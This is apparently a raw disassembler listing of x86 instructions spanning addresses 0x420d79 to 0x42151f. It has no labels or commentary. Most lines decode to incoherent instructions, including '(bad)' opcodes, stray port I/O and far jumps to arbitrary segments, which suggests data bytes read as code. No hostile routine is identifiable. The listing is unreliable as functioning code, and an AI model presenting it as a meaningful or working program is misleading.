  420d79:	stos   DWORD PTR es:[edi],eax
  420d7a:	stc    
  420d7b:	in     eax,dx
  420d7c:	ret    
  420d7d:	clc    
  420d7e:	push   ds
  420d7f:	mov    al,ds:0x2fee25ad
  420d84:	(bad)  
  420d85:	jns    0x420d73
  420d87:	push   0x6bf7e87a
  420d8c:	jo     0x420dde
  420d8e:	jbe    0x420d8d
  420d90:	frstor [esi+0x5d9514a6]
  420d96:	call   0x2430:0x4d19a900
  420d9d:	xchg   DWORD PTR [edi+0xd],eax
  420da0:	push   cs
  420da1:	loop   0x420d2b
  420da3:	pop    esi
  420da4:	adc    edi,esi
  420da6:	ror    DWORD PTR [ebx],0x0
  420da9:	data16 cmc 
  420dab:	mov    BYTE PTR [ebx-0x3107def9],bl
  420db1:	pop    esp
  420db2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420db3:	pop    ecx
  420db4:	out    0xef,al
  420db6:	or     DWORD PTR [esi],eax
  420db8:	xor    al,0xaa
  420dba:	xor    BYTE PTR ds:0x92342e68,bl
  420dc0:	pushw  es
  420dc2:	inc    esp
  420dc3:	adc    al,0x59
  420dc5:	mov    bh,0xef
  420dc7:	mov    esp,0x57b08717
  420dcc:	out    0xee,eax
  420dce:	add    DWORD PTR [esi],ebx
  420dd0:	aad    0x52
  420dd2:	pop    edx
  420dd3:	pop    ebp
  420dd4:	pop    ss
  420dd5:	pop    ecx
  420dd6:	mov    dl,BYTE PTR [ecx+edx*4+0x48]
  420dda:	iret   
  420ddb:	jmp    0x86b57d60
  420de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420de1:	(bad)  
  420de2:	ficom  WORD PTR [ecx-0xd80e66e]
  420de8:	inc    ebx
  420de9:	stos   DWORD PTR es:[edi],eax
  420dea:	aaa    
  420deb:	pop    es
  420dec:	push   esp
  420ded:	xchg   ebp,eax
  420dee:	dec    eax
  420def:	jmp    0x420e06
  420df1:	test   eax,0xf6ed3f3e
  420df6:	test   BYTE PTR [esp+ebx*2],al
  420df9:	cdq    
  420dfa:	nop
  420dfb:	addr16 rcr al,cl
  420dfe:	dec    ecx
  420dff:	inc    ecx
  420e00:	sbb    eax,DWORD PTR es:[eax]
  420e03:	fwait
  420e04:	dec    ecx
  420e05:	inc    ebx
  420e06:	ins    BYTE PTR es:[edi],dx
  420e07:	imul   edx,DWORD PTR [edi-0x17],0x49
  420e0b:	xor    eax,0xb37da23
  420e10:	mov    eax,edx
  420e12:	xchg   DWORD PTR es:[esi-0x50],edx
  420e16:	inc    eax
  420e17:	cmp    al,0x14
  420e19:	fimul  DWORD PTR [edx]
  420e1b:	mov    WORD PTR [ebx],cs
  420e1d:	repnz pop ebp
  420e1f:	lds    esp,FWORD PTR [ecx]
  420e21:	pushf  
  420e22:	mov    ebx,0x6d88cab
  420e27:	ja     0x420e76
  420e29:	lea    edi,[esi-0x74]
  420e2c:	adc    al,0x13
  420e2e:	stos   DWORD PTR es:[edi],eax
  420e2f:	lahf   
  420e30:	in     al,0x3f
  420e32:	popa   
  420e33:	lods   al,BYTE PTR ds:[esi]
  420e34:	dec    edx
  420e35:	aaa    
  420e36:	mov    edi,0x18e18fe1
  420e3b:	scas   eax,DWORD PTR es:[edi]
  420e3c:	fs out dx,eax
  420e3e:	sub    al,0x7b
  420e40:	pop    eax
  420e41:	mul    eax
  420e43:	xlat   BYTE PTR ds:[ebx]
  420e44:	and    ah,0xed
  420e47:	mov    ebx,0x462d77cd
  420e4c:	adc    BYTE PTR ss:[edi-0x3b65f309],cl
  420e53:	popf   
  420e54:	mov    esp,0x5670d5fa
  420e59:	jmp    0x4539c2c
  420e5e:	add    DWORD PTR [ebx-0x20a825e9],edi
  420e64:	jp     0x420e9d
  420e66:	push   0xffffffb9
  420e68:	ins    BYTE PTR es:[edi],dx
  420e69:	aam    0x88
  420e6b:	(bad)  [esi+0x5e94f4da]
  420e71:	cli    
  420e72:	pop    edx
  420e73:	or     BYTE PTR ds:0xfc46d8be,ch
  420e79:	fild   DWORD PTR [eax]
  420e7b:	add    BYTE PTR [eax-0x11],cl
  420e7e:	ja     0x420eeb
  420e80:	idiv   ebx
  420e82:	pop    esp
  420e83:	out    dx,eax
  420e84:	dec    esp
  420e85:	mul    BYTE PTR [esi-0x7d]
  420e88:	dec    edx
  420e89:	and    dl,bl
  420e8b:	call   0x286:0x18a58
  420e92:	add    BYTE PTR [eax],al
  420e94:	sbb    dl,bl
  420e96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e97:	pop    ebp
  420e98:	dec    edi
  420e99:	mov    BYTE PTR [edx],bl
  420e9b:	add    BYTE PTR [ebp+0x6adb9b54],cl
  420ea1:	neg    eax
  420ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ea4:	pop    eax
  420ea5:	push   0xb8ed3412
  420eaa:	fwait
  420eab:	aam    0x82
  420ead:	jno    0x420e7d
  420eaf:	xor    ebp,ebp
  420eb1:	aaa    
  420eb2:	pop    ebp
  420eb3:	and    ebx,DWORD PTR [ecx]
  420eb5:	jge    0x420efe
  420eb7:	jnp    0x420e5b
  420eb9:	icebp  
  420eba:	fdivr  QWORD PTR [esi]
  420ebc:	adc    al,BYTE PTR [ebp-0x7]
  420ebf:	(bad)  
  420ec0:	int    0xc0
  420ec2:	push   ebp
  420ec3:	mov    ch,0xb5
  420ec5:	and    edi,esp
  420ec7:	dec    ebx
  420ec8:	dec    esi
  420ec9:	jl     0x420eb7
  420ecb:	dec    eax
  420ecc:	sub    BYTE PTR [eax],dh
  420ece:	dec    esp
  420ecf:	rcr    DWORD PTR [bx+di-0x7d79],1
  420ed4:	inc    esp
  420ed5:	les    edx,FWORD PTR [ebx+0x6bdae6e0]
  420edb:	or     DWORD PTR [ebx-0x72],edi
  420ede:	lahf   
  420edf:	adc    DWORD PTR ds:0x63526896,ebp
  420ee5:	retf   
  420ee6:	arpl   ax,bp
  420ee8:	fst    QWORD PTR [ebp-0x539a3c0]
  420eee:	jns    0x420ebe
  420ef0:	xchg   esp,eax
  420ef1:	lock or eax,0xe69982cf
  420ef7:	mov    ecx,0x55b55d6
  420efc:	(bad)  
  420efd:	mov    ebx,0xd6801907
  420f02:	mov    esi,0x987b7a80
  420f07:	mov    al,0xf4
  420f09:	cld    
  420f0a:	aas    
  420f0b:	xor    DWORD PTR [esi],edx
  420f0d:	in     eax,dx
  420f0e:	xchg   ebx,eax
  420f0f:	xor    eax,0xf5b0083b
  420f14:	fisub  WORD PTR [ebp-0x4c10349]
  420f1a:	xor    ebx,DWORD PTR [ebx]
  420f1c:	out    0xcb,ax
  420f1f:	mov    cs,WORD PTR [eax-0x43e8fbbd]
  420f25:	push   edx
  420f26:	aam    0xd0
  420f28:	sbb    DWORD PTR [eax-0x32],ebx
  420f2b:	bound  ebx,QWORD PTR [edi+0x54e259f4]
  420f31:	js     0x420faf
  420f33:	stos   BYTE PTR es:[edi],al
  420f34:	in     al,0xe6
  420f36:	sbb    eax,0x54a004ba
  420f3b:	pop    ebp
  420f3c:	pop    ecx
  420f3d:	test   BYTE PTR [esi+0x1551e335],bh
  420f43:	fs mov ah,0x1
  420f46:	xor    DWORD PTR [ebp-0xe],esp
  420f49:	add    DWORD PTR [esi],eax
  420f4b:	(bad)  
  420f4c:	icebp  
  420f4d:	push   ebx
  420f4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f4f:	fimul  WORD PTR [ebp-0x43c14dd2]
  420f55:	es jge 0x420fa7
  420f58:	cmp    esp,DWORD PTR [ebp-0x3c]
  420f5b:	xor    cl,cl
  420f5d:	mov    WORD PTR [edx-0x1653c542],gs
  420f63:	dec    esi
  420f64:	pop    esp
  420f65:	push   0x4b19399a
  420f6a:	rcl    BYTE PTR [edi-0x4],1
  420f6d:	adc    ecx,ebp
  420f6f:	aaa    
  420f70:	(bad)  
  420f71:	in     eax,0xe3
  420f73:	sbb    DWORD PTR [edx],ebp
  420f75:	pop    esi
  420f76:	addr16 enter 0x41ad,0x5d
  420f7b:	pop    ds
  420f7c:	out    0x95,eax
  420f7e:	pop    esi
  420f7f:	and    eax,0x91a9c60b
  420f84:	repz mov ah,0x39
  420f87:	sub    esp,DWORD PTR [edi-0xf196e81]
  420f8d:	or     ah,dh
  420f8f:	int    0x28
  420f91:	xchg   DWORD PTR ds:0x1b39c348,edx
  420f97:	pop    ss
  420f98:	repz jbe 0x420f4e
  420f9b:	fistp  QWORD PTR [ebx+0x15]
  420f9e:	cwde   
  420f9f:	(bad)  
  420fa1:	pop    edi
  420fa2:	pop    edi
  420fa3:	shl    dh,1
  420fa5:	push   es
  420fa6:	pop    ds
  420fa7:	ror    edx,1
  420fa9:	and    DWORD PTR [ebx+0x64],edx
  420fac:	xor    dh,bl
  420fae:	mov    edx,0xa1a620f0
  420fb3:	dec    eax
  420fb4:	mov    bh,BYTE PTR [ebx-0x2f]
  420fb7:	mov    al,BYTE PTR ds:0x21decb31
  420fbd:	ret    0x7c15
  420fc0:	imul   ebx,DWORD PTR [edi-0x41],0x2e
  420fc4:	lods   al,BYTE PTR ds:[esi]
  420fc5:	mov    dh,BYTE PTR [ecx+0x3f50115e]
  420fcb:	pop    eax
  420fcc:	popf   
  420fcd:	int    0xc5
  420fcf:	jge    0x420f73
  420fd1:	hlt    
  420fd2:	xchg   ebx,eax
  420fd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fd4:	std    
  420fd5:	push   ds
  420fd6:	adc    al,0x3e
  420fd8:	xchg   ebp,eax
  420fd9:	jmp    0x546a:0x1426ff23
  420fe0:	jne    0x421015
  420fe2:	clc    
  420fe3:	push   edx
  420fe4:	jmp    0x421037
  420fe6:	pop    ds
  420fe7:	sub    bh,cl
  420fe9:	sbb    WORD PTR [edi-0x68c73dba],0xffd0
  420ff1:	ds xchg ebx,eax
  420ff3:	das    
  420ff4:	pop    es
  420ff5:	aad    0xfb
  420ff7:	add    eax,0x5673be02
  420ffc:	mov    eax,0xc386e243
  421001:	push   esi
  421002:	retf   0xb1be
  421005:	inc    ebp
  421006:	xor    ebp,DWORD PTR [edi-0x11]
  421009:	and    edi,edi
  42100b:	xor    BYTE PTR [edx],al
  42100d:	(bad)  
  42100e:	cs push edx
  421010:	or     cl,ah
  421012:	pusha  
  421013:	inc    esi
  421014:	shl    DWORD PTR [ecx],1
  421016:	bound  esp,QWORD PTR [ebx+ebx*8+0x536696c3]
  42101d:	sbb    DWORD PTR [ecx],edx
  42101f:	call   0x8087c630
  421024:	or     bh,al
  421026:	lds    eax,FWORD PTR [edx-0x3ebcce4e]
  42102c:	repz pusha 
  42102e:	xor    al,0x69
  421030:	ss je  0x421053
  421033:	fwait
  421034:	mov    eax,0x43ec586a
  421039:	dec    edx
  42103a:	fwait
  42103b:	aad    0xb6
  42103d:	es cdq 
  42103f:	and    ebx,DWORD PTR [ecx]
  421041:	(bad)  
  421042:	mov    ch,0xcd
  421044:	xchg   ecx,eax
  421045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421046:	setnp  BYTE PTR [ebx-0x4e]
  42104a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42104b:	pop    ebx
  42104c:	push   eax
  42104d:	popf   
  42104e:	loopne 0x42100c
  421050:	xor    DWORD PTR [ecx-0x7c],0x7403ec4a
  421057:	shl    DWORD PTR [esi+0x7c922042],0xac
  42105e:	xchg   edi,eax
  42105f:	sbb    ah,BYTE PTR [edx-0x39c31982]
  421065:	jns    0x42105d
  421067:	les    eax,FWORD PTR [edx]
  421069:	xchg   ebp,eax
  42106a:	mov    al,ds:0xfa9f6368
  42106f:	test   al,dl
  421071:	dec    esi
  421072:	shl    BYTE PTR [edx+0x8],0x95
  421076:	sbb    eax,edi
  421078:	aam    0xda
  42107a:	sar    ecx,1
  42107c:	push   0xffffffdc
  42107e:	push   edi
  42107f:	outs   dx,DWORD PTR ds:[esi]
  421081:	aaa    
  421082:	jmp    0xa65:0xce86d285
  421089:	(bad)  [edi-0x4f3c6b1e]
  42108f:	imul   ecx,ecx,0xf85ee567
  421095:	xlat   BYTE PTR ds:[ebx]
  421096:	jmp    FWORD PTR [ebx+0x62]
  421099:	mov    esp,0xb3f8cc3e
  42109e:	call   0x1653:0xe217cc73
  4210a5:	lods   eax,DWORD PTR ds:[esi]
  4210a6:	ds cli 
  4210a8:	adc    eax,0xebda55af
  4210ad:	jns    0x421091
  4210af:	jns    0x421120
  4210b1:	cwde   
  4210b2:	adc    al,0x4d
  4210b4:	(bad)  
  4210b5:	setge  dh
  4210b8:	mov    eax,0xe256bf72
  4210bd:	or     al,0x91
  4210bf:	in     al,dx
  4210c0:	xchg   BYTE PTR [eax+eiz*2-0x5e388ec1],dl
  4210c7:	push   0xffffffac
  4210c9:	aas    
  4210ca:	(bad)  
  4210cc:	rol    BYTE PTR [ecx+0x17],1
  4210cf:	ret    
  4210d0:	js     0x421113
  4210d2:	ret    
  4210d3:	(bad)
  4210d6:	xchg   ebx,eax
  4210d7:	jg     0x421141
  4210d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210da:	mov    ebx,ecx
  4210dc:	dec    edx
  4210dd:	int3   
  4210de:	dec    esi
  4210df:	lock cmp al,0x3b
  4210e2:	arpl   bp,bp
  4210e4:	sub    bl,BYTE PTR [ebp-0xd]
  4210e7:	pop    es
  4210e8:	mov    eax,0x4b89be12
  4210ed:	leave  
  4210ee:	pop    eax
  4210ef:	mov    ch,0xa2
  4210f1:	mov    ecx,0x19c88ada
  4210f6:	add    eax,0xd4042b7
  4210fb:	shl    esi,cl
  4210fd:	lods   eax,DWORD PTR ds:[esi]
  4210fe:	push   ebp
  4210ff:	mov    eax,0x81ecc223
  421104:	xor    al,0x7c
  421106:	imul   esi,DWORD PTR ds:0x19a8e7c9,0x87c77b13
  421110:	add    cl,BYTE PTR [edi]
  421112:	out    0x5a,eax
  421114:	(bad)  
  421115:	xor    ebp,DWORD PTR [esi-0x4d]
  421118:	pop    es
  421119:	xchg   BYTE PTR [eax],al
  42111b:	add    BYTE PTR [eax+0x5be35ae3],dh
  421121:	sti    
  421122:	mov    ecx,0x72415ff3
  421127:	test   DWORD PTR [ebx],eax
  421129:	aam    0xed
  42112b:	mov    ds,esi
  42112d:	mov    WORD PTR [ecx],es
  42112f:	add    BYTE PTR [esi+0x4000002],al
  421135:	sti    
  421136:	mov    cl,0x85
  421138:	push   ebx
  421139:	repnz and esi,DWORD PTR [ecx+ebx*1+0x7039d453]
  421141:	test   al,0xd6
  421143:	stos   BYTE PTR es:[edi],al
  421144:	dec    esi
  421145:	inc    ebx
  421146:	(bad)  
  421148:	push   ecx
  421149:	ss xchg edx,eax
  42114b:	scas   al,BYTE PTR es:[edi]
  42114c:	retf   
  42114d:	dec    ebx
  42114e:	mov    ds:0xbda56c2b,al
  421153:	out    dx,eax
  421154:	push   cs
  421155:	outs   dx,DWORD PTR ds:[esi]
  421156:	dec    esi
  421157:	push   cs
  421158:	out    dx,al
  421159:	test   al,0xcb
  42115b:	fsubr  st(6),st
  42115d:	add    BYTE PTR [ecx+edx*2-0x35],ch
  421161:	int3   
  421162:	enter  0x2828,0x56
  421166:	inc    edx
  421167:	mov    eax,DWORD PTR [ebx-0x3c47c558]
  42116d:	sbb    esi,DWORD PTR [ebp-0xc]
  421170:	cmp    edi,DWORD PTR [edi]
  421172:	push   0x1c
  421174:	mov    bl,0x2f
  421176:	ds in  eax,0x2
  421179:	mov    edx,0xee015783
  42117e:	and    edx,DWORD PTR [ebx+0x32]
  421181:	out    0xc6,eax
  421183:	das    
  421184:	aas    
  421185:	ja     0x4211a6
  421187:	fidivr WORD PTR [ecx]
  421189:	jl     0x4211a2
  42118b:	mov    ah,0xb1
  42118d:	ja     0x421140
  42118f:	and    edx,esi
  421191:	aaa    
  421192:	adc    BYTE PTR [eax+0x65],cl
  421195:	jmp    0x42115e
  421197:	jmp    0xe067ae44
  42119c:	pop    ds
  42119d:	retf   0x5698
  4211a0:	ret    
  4211a1:	imul   esi,esi,0x67
  4211a4:	fbstp  TBYTE PTR [edi]
  4211a6:	mov    esp,0x7e699b56
  4211ab:	or     bh,BYTE PTR [edi+ebp*1]
  4211ae:	sti    
  4211af:	dec    edx
  4211b0:	js     0x421189
  4211b2:	cmp    BYTE PTR [esi],dh
  4211b4:	test   eax,0xcecb677
  4211b9:	adc    eax,0xbaae2849
  4211be:	rol    DWORD PTR [ebx+0x5c8be812],cl
  4211c4:	sbb    DWORD PTR [ecx+0x68],esp
  4211c7:	das    
  4211c8:	aad    0xc2
  4211ca:	mov    esi,0xf55c4b5c
  4211cf:	iret   
  4211d0:	mov    dl,0xd6
  4211d2:	(bad)  
  4211d3:	sub    cl,BYTE PTR [esi-0x26]
  4211d6:	cmp    esi,esp
  4211d8:	sub    eax,0x481f66fb
  4211dd:	aaa    
  4211de:	pop    ds
  4211df:	xchg   DWORD PTR [ebx+0x6b],edi
  4211e2:	jns    0x4211e6
  4211e4:	sbb    ebx,DWORD PTR [eax-0x143c10b4]
  4211ea:	lds    ebp,FWORD PTR [ebx]
  4211ec:	mov    eax,0x42d5958a
  4211f1:	cld    
  4211f2:	jp     0x4211ac
  4211f4:	ror    ch,cl
  4211f6:	dec    edx
  4211f7:	(bad)  
  4211f8:	jle    0x421186
  4211fa:	fidivr DWORD PTR [edi]
  4211fc:	mov    dl,0x16
  4211fe:	add    BYTE PTR [ecx-0x6737272e],dh
  421204:	ja     0x421244
  421206:	ja     0x421254
  421208:	dec    ebp
  421209:	out    dx,al
  42120a:	mov    al,0x7a
  42120c:	adc    eax,DWORD PTR [esi+esi*1+0x79]
  421210:	mov    edx,0x88b58b59
  421215:	aas    
  421216:	inc    esi
  421217:	jo     0x4211f9
  421219:	adc    ebx,DWORD PTR ds:0xc0563d53
  42121f:	fldenv [edx]
  421221:	out    dx,al
  421222:	inc    eax
  421223:	jecxz  0x4211cb
  421225:	and    DWORD PTR [eax],0x319aa059
  42122b:	retf   0x4ee1
  42122e:	imul   esi,DWORD PTR [ebx-0x2fcc2f6e],0xfffffff8
  421235:	adc    DWORD PTR [ebx],eax
  421237:	out    0x75,al
  421239:	icebp  
  42123a:	or     al,0x61
  42123c:	dec    esp
  42123d:	lods   eax,DWORD PTR ds:[esi]
  42123e:	ja     0x42122a
  421240:	mov    ebp,0xa13ae491
  421245:	push   0xffffffcd
  421247:	das    
  421248:	mov    dh,0xdb
  42124a:	hlt    
  42124b:	shr    BYTE PTR [edi],0x2f
  42124e:	dec    edi
  42124f:	stc    
  421250:	fld    st(6)
  421252:	stos   BYTE PTR es:[edi],al
  421253:	stos   DWORD PTR es:[edi],eax
  421254:	cmp    BYTE PTR [edi-0x3],0xf1
  421258:	out    dx,al
  421259:	pop    ebp
  42125a:	or     eax,0x6a0dd42d
  42125f:	cmp    esi,DWORD PTR [edx+edi*1]
  421262:	sar    BYTE PTR [edx-0x18],0x7d
  421266:	cdq    
  421267:	sub    bl,ch
  421269:	lds    ebp,FWORD PTR [ebx]
  42126b:	(bad)  
  42126c:	out    0x74,eax
  42126e:	mov    eax,ds:0x5a9e9772
  421273:	mov    WORD PTR [ebx+0x3f],?
  421276:	mov    eax,0x38fbee0d
  42127b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42127c:	xchg   ecx,eax
  42127d:	ins    DWORD PTR es:[edi],dx
  42127e:	jbe    0x4212a0
  421280:	and    eax,0x820f0c6
  421285:	or     eax,DWORD PTR [ecx-0x6c]
  421288:	cmp    edx,DWORD PTR [edi+0x43]
  42128b:	xor    DWORD PTR [ebx+0x431551d5],ecx
  421291:	leave  
  421292:	sbb    dh,BYTE PTR [esp+ecx*1]
  421295:	pop    ebx
  421296:	test   ah,bh
  421298:	pop    ds
  421299:	lock scas al,BYTE PTR es:[edi]
  42129b:	mov    al,ds:0x1a590589
  4212a0:	repnz fist DWORD PTR [ebx]
  4212a3:	cmp    DWORD PTR [ebp-0x337c6709],ebp
  4212a9:	sbb    al,0xaa
  4212ab:	lea    esi,[ebp-0x5a]
  4212ae:	fbld   TBYTE PTR ds:0xb8ae8e37
  4212b4:	adc    dl,bh
  4212b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212b7:	xchg   eax,edi
  4212b9:	cmp    DWORD PTR [eax+0x55e460cd],0x33
  4212c0:	mov    cl,0xab
  4212c2:	pop    ecx
  4212c3:	jbe    0x4212c3
  4212c5:	ficomp DWORD PTR [edx]
  4212c7:	mov    dh,0x37
  4212c9:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4212cb:	push   eax
  4212cc:	xor    edi,eax
  4212ce:	dec    esi
  4212cf:	or     esp,DWORD PTR [eax]
  4212d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212d2:	bound  esi,QWORD PTR [edx]
  4212d4:	pop    ebx
  4212d5:	jne    0x421293
  4212d7:	inc    ecx
  4212d8:	dec    edi
  4212d9:	xor    al,0x7c
  4212db:	pop    ds
  4212dc:	mov    bl,0x1f
  4212de:	xchg   ebx,eax
  4212df:	(bad)
  4212e4:	(bad)
  4212e9:	push   esp
  4212ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212eb:	jbe    0x4212f0
  4212ed:	adc    al,ch
  4212ef:	lods   eax,DWORD PTR ds:[esi]
  4212f0:	mov    ds:0xad281601,al
  4212f5:	inc    ebp
  4212f6:	js     0x4212ea
  4212f8:	pop    ecx
  4212f9:	sub    BYTE PTR [edx-0x2ada0fff],dl
  4212ff:	dec    ebp
  421300:	pop    ds
  421301:	inc    al
  421303:	vphaddd xmm7,xmm5,XMMWORD PTR ds:0xb2a5a6e6
  42130c:	test   eax,0xe4625797
  421311:	xchg   esi,eax
  421312:	jb     0x421331
  421314:	jno    0x4212d7
  421316:	add    eax,0xe6dfed53
  42131b:	dec    ebx
  42131c:	(bad)  
  42131f:	sbb    eax,0xe6ba4caf
  421324:	dec    esi
  421325:	dec    edi
  421326:	popa   
  421327:	lea    esi,[ebx+0x118c48d7]
  42132d:	sub    ebp,esi
  42132f:	adc    bl,ah
  421331:	ret    
  421332:	fs mov cs,edx
  421335:	add    al,0xb0
  421337:	cmp    eax,0x690a19ef
  42133c:	ret    
  42133d:	add    al,0x25
  42133f:	push   ebp
  421340:	mov    dl,0x27
  421342:	lahf   
  421343:	fbstp  TBYTE PTR [esi]
  421345:	ss gs cmp al,0xa8
  421349:	repz mov ds:0x7be15282,eax
  42134f:	or     ebx,ecx
  421351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421352:	adc    eax,0xa7f14ee0
  421357:	sbb    edx,edx
  421359:	outs   dx,DWORD PTR ds:[esi]
  42135a:	fld    DWORD PTR [ebx+ebp*1-0x7869bb39]
  421361:	mov    ds:0xca948f65,al
  421366:	repnz add BYTE PTR [eax-0x74],bl
  42136a:	dec    esp
  42136b:	out    dx,eax
  42136c:	jle    0x421362
  42136e:	lds    edx,FWORD PTR gs:[edx+0x4e231e9c]
  421375:	and    ebp,edi
  421377:	icebp  
  421378:	fdivr  st(6),st
  42137a:	stos   BYTE PTR es:[edi],al
  42137b:	xchg   esi,eax
  42137c:	push   esp
  42137d:	jae    0x421368
  42137f:	fwait
  421380:	dec    ebp
  421381:	mov    ah,0x3b
  421383:	xor    DWORD PTR fs:[esi-0x7b],esp
  421387:	std    
  421388:	aam    0xef
  42138a:	repnz fninit 
  42138d:	mov    ?,WORD PTR [edx]
  42138f:	int3   
  421390:	daa    
  421391:	test   al,0x15
  421393:	test   al,0xcf
  421395:	lods   al,BYTE PTR ds:[esi]
  421396:	hlt    
  421397:	sar    DWORD PTR [esi+0x6b],0x3
  42139b:	mov    edx,0xa84d0f1
  4213a0:	sub    dl,bh
  4213a2:	jo     0x4213b4
  4213a4:	mov    bh,0x20
  4213a6:	bnd jae 0x42136a
  4213a9:	push   esp
  4213aa:	neg    ch
  4213ac:	cmp    dl,ch
  4213ae:	cmp    BYTE PTR [edx-0x5c7b1b69],0xa1
  4213b5:	sub    al,0xce
  4213b7:	cmp    BYTE PTR [edi-0x2c],dl
  4213ba:	add    BYTE PTR [eax],al
  4213bc:	xor    eax,0xbf06168e
  4213c1:	sahf   
  4213c2:	xor    eax,0xa0e807bf
  4213c7:	mov    edx,0xe7099cd9
  4213cc:	pop    DWORD PTR fs:[ecx]
  4213cf:	add    BYTE PTR [esi+0x6b000002],al
  4213d5:	jnp    0x421373
  4213d7:	arpl   ax,si
  4213d9:	xchg   edi,eax
  4213da:	sub    eax,0xd187860a
  4213df:	sbb    edi,DWORD PTR es:[esi]
  4213e2:	adc    bl,BYTE PTR [esi+0x4e]
  4213e5:	cmc    
  4213e6:	in     al,0xb6
  4213e8:	ja     0x42137c
  4213ea:	rcr    cl,cl
  4213ec:	or     ah,BYTE PTR [eax+edi*2+0x74d5c38b]
  4213f3:	mov    ch,0x4a
  4213f5:	ja     0x4213cb
  4213f7:	adc    dh,BYTE PTR [esi+eax*1+0x5a20e9e6]
  4213fe:	lock adc bl,BYTE PTR [esi+0x10]
  421402:	inc    esi
  421403:	lods   eax,DWORD PTR ds:[esi]
  421404:	sub    BYTE PTR [ebx+0x74],0x4c
  421408:	leave  
  421409:	xchg   ecx,eax
  42140a:	add    ebx,DWORD PTR [edx-0x19]
  42140d:	clc    
  42140e:	xchg   ebx,eax
  42140f:	fs scas al,BYTE PTR es:[edi]
  421411:	faddp  st(1),st
  421413:	xlat   BYTE PTR ds:[ebx]
  421414:	push   ss
  421415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421416:	adc    bh,al
  421418:	scas   al,BYTE PTR es:[edi]
  421419:	daa    
  42141a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42141b:	adc    esi,esp
  42141d:	lods   al,BYTE PTR ds:[esi]
  42141e:	jne    0x4213a9
  421420:	jae    0x42143d
  421422:	or     ecx,DWORD PTR [esi+0x4552a147]
  421428:	adc    DWORD PTR [ebx],ecx
  42142a:	sbb    esp,ebx
  42142c:	iret   
  42142d:	(bad)  
  42142e:	cmp    DWORD PTR [edi+0x43],edi
  421431:	div    DWORD PTR [edi-0x56]
  421434:	sti    
  421435:	cwde   
  421436:	leave  
  421437:	xor    BYTE PTR [ecx+ebp*2-0x36b5493c],dl
  42143e:	jae    0x421439
  421440:	jmp    0x4f6c2d3
  421445:	adc    al,0x94
  421447:	jl     0x421406
  421449:	dec    esi
  42144a:	pop    ds
  42144b:	inc    esp
  42144c:	ins    DWORD PTR es:[edi],dx
  42144d:	in     al,0xd0
  42144f:	xchg   edx,eax
  421450:	pop    esi
  421451:	in     eax,0xcd
  421453:	stc    
  421454:	jae    0x4214d2
  421456:	les    eax,FWORD PTR [edx]
  421458:	add    BYTE PTR [edi],ah
  42145a:	push   eax
  42145b:	mov    eax,0xd52680e0
  421460:	jmp    0x42140c
  421462:	jne    0x42145e
  421464:	out    0xc2,al
  421466:	add    DWORD PTR [ebp+0x22],ebp
  421469:	test   BYTE PTR [ecx-0x3f3d4b59],ah
  42146f:	enter  0x167a,0xe9
  421473:	push   ecx
  421474:	inc    eax
  421475:	dec    edx
  421476:	jae    0x4214ac
  421478:	add    BYTE PTR [edi+ebp*8+0x129f0110],cl
  42147f:	push   eax
  421480:	scas   eax,DWORD PTR es:[edi]
  421481:	mov    edx,0xc5afff0e
  421486:	test   al,0xed
  421488:	pusha  
  421489:	(bad)  
  42148a:	shl    BYTE PTR [ebx],1
  42148c:	add    al,0xfa
  42148e:	jmp    0x505cf754
  421493:	inc    ecx
  421494:	into   
  421495:	imul   edx,DWORD PTR [edx],0x2968bce4
  42149b:	cmp    DWORD PTR [eax-0x2f],ebp
  42149e:	je     0x421492
  4214a0:	sub    al,0xea
  4214a2:	packuswb mm4,QWORD PTR [esi]
  4214a5:	or     ah,ah
  4214a7:	xchg   esp,eax
  4214a8:	aam    0x85
  4214aa:	(bad)  
  4214ab:	mov    edx,0x66ecaa10
  4214b0:	leave  
  4214b1:	pop    esp
  4214b2:	cli    
  4214b3:	outs   dx,BYTE PTR ds:[esi]
  4214b4:	cmp    BYTE PTR [eax-0x20],al
  4214b7:	jo     0x421500
  4214b9:	jnp    0x4214bd
  4214bb:	mov    ds:0xd53879aa,eax
  4214c0:	fyl2xp1 
  4214c2:	add    BYTE PTR [ecx-0x27],ah
  4214c5:	popa   
  4214c6:	(bad)  
  4214c7:	out    dx,eax
  4214c8:	loopne 0x421529
  4214ca:	sbb    BYTE PTR ds:0xbac9,dl
  4214cf:	aaa    
  4214d0:	push   ecx
  4214d1:	jno    0x42150c
  4214d3:	lods   al,BYTE PTR ds:[esi]
  4214d4:	pop    ds
  4214d5:	xor    al,0x9
  4214d7:	shl    BYTE PTR [ecx-0x72e3c01e],cl
  4214dd:	sub    DWORD PTR [ebx],eax
  4214df:	mov    ch,0x1f
  4214e1:	add    ch,dl
  4214e3:	cld    
  4214e4:	and    eax,0x27454a48
  4214e9:	popa   
  4214ea:	mov    ds:0xd22d9024,eax
  4214ef:	add    BYTE PTR [esi+0x5e470c5],al
  4214f5:	lods   eax,DWORD PTR ds:[esi]
  4214f6:	dec    edx
  4214f7:	cmp    eax,0x698cd28f
  4214fc:	adc    al,0x29
  4214fe:	mov    al,ds:0x5baadec8
  421503:	aad    0x72
  421505:	mov    eax,ds:0x4e6351d4
  42150a:	pop    ss
  42150b:	push   ecx
  42150c:	outs   dx,DWORD PTR ds:[esi]
  42150d:	mov    edx,0x5b5cebaf
  421512:	enter  0xb787,0x7c
  421516:	(bad)  
  421517:	ret    0xce80
  42151a:	addr16 pop ecx
  42151c:	push   eax
  42151d:	retf   
  42151e:	stc    
  42151f:	mov    ah,0xab
